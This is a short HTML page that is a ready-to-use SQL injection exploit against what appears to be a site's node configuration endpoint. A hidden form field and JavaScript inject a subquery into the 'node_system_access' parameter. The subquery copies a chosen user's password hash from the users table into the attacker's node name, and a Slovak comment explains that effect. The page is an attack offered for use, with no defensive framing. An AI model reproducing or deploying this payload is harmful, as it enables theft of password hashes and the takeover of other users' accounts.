<!--
This program is free software. It comes without any warranty, to
the extent permitted by applicable law. You can redistribute it
and/or modify it under the terms of the Do What The Fuck You Want
To Public License, Version 2, as published by Sam Hocevar. See
http://sam.zoy.org/wtfpl/COPYING for more details.
-->

<html>
<head>
<title>node_system_access sql injection</title>
<meta http-equiv="Cache-Control" content="Public">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1250">
<link rel="shortcut icon" href="/id/1459933/download">
<link rel='stylesheet' type='text/css' href='/id/1126515/download'>
</head>

<body>
<script type="text/javascript">
function access_node_system(what)
{
 var id = document.getElementById('user_id').value;
 if(!isNaN(id)) {
  document.getElementById('node_system_access').value = "public', node_name=(select password from users where user_id='"+id+"'), node_parent='";
  what.submit();
 }
}
</script>
nastavi tvoj system_access na 'public', tvoj node_name na hash of desired id's pwd a tvojho parenta na ''
<br>
<noscript>javascript not enabled, user_id defaults to {$user_id}</noscript>
<form method="post" enctype="multipart/form-data" action="/id/{$user_id}/">
<input type="hidden" name="node_system_access" id="node_system_access" value="public', node_name=(select password from users where user_id='{$user_id}'), node_parent='">
<input type="hidden" name="event" value="configure_system_access">
<script type="text/javascript">
document.write("<input type="text" size="7" name="user_id" id="user_id" value="{$user_id}">");
</script>
<input type="submit" value="get_pwd_hash" onclick="access_node_system(this);return false">
</form>


